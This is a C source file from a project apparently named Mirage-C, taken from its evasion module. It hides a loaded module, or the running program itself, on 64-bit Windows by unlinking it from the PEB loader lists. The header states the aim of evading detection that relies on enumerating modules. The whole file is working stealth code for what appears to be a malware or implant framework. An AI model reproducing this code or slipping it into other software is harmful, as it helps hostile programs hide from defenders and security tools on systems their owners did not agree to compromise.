/*
 * peb_hide.c — PEB module hiding for Mirage-C
 *
 * Direct translation of Zig src/evasion/peb_hide.zig.
 * Unlinks a module from PEB->Ldr linked lists to evade
 * module enumeration-based detection.
 */

#include "peb_hide.h"
#include "config.h"
#include "nt_types.h"

#ifdef ENABLE_PEB_HIDE
#include <string.h>

/* Define CONTAINING_RECORD if not available */
#ifndef CONTAINING_RECORD
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((char *)(address) - (unsigned long)(&((type *)0)->field)))
#endif

#ifdef _WIN64

/* ── getPEB — Access PEB via TEB (x64) ───────────────────── */

static PPEB get_peb(void) {
    PPEB peb_ptr;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb_ptr));
    return peb_ptr;
}

/* ── unlinkEntry ──────────────────────────────────────────── */

static void unlink_entry(PLIST_ENTRY entry) {
    PLIST_ENTRY flink = entry->Flink;
    PLIST_ENTRY blink = entry->Blink;
    flink->Blink = blink;
    blink->Flink = flink;
    entry->Flink = entry;
    entry->Blink = entry;
}

/* ── mirage_unlink_module ─────────────────────────────────── */

int mirage_unlink_module(void* target_base) {
    PPEB peb_ptr = get_peb();
    if (!peb_ptr || !peb_ptr->Ldr) return 0;

    PPEB_LDR_DATA ldr = peb_ptr->Ldr;
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY ldr_entry = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );

        if (ldr_entry->DllBase == target_base) {
            unlink_entry(&ldr_entry->InLoadOrderLinks);
            unlink_entry(&ldr_entry->InMemoryOrderLinks);
            unlink_entry(&ldr_entry->InInitializationOrderLinks);
            return 1;
        }

        entry = entry->Flink;
    }

    return 0;
}

/* ── mirage_hide_self ─────────────────────────────────────── */

int mirage_hide_self(void) {
    PPEB peb_ptr = get_peb();
    if (!peb_ptr) return 0;
    return mirage_unlink_module(peb_ptr->ImageBaseAddress);
}

#else

/* x86 stub — not implemented for x86 targets */
int mirage_unlink_module(void* target_base) {
    (void)target_base;
    return 0;
}

int mirage_hide_self(void) {
    return 0;
}

#endif /* _WIN64 */

#endif /* ENABLE_PEB_HIDE */
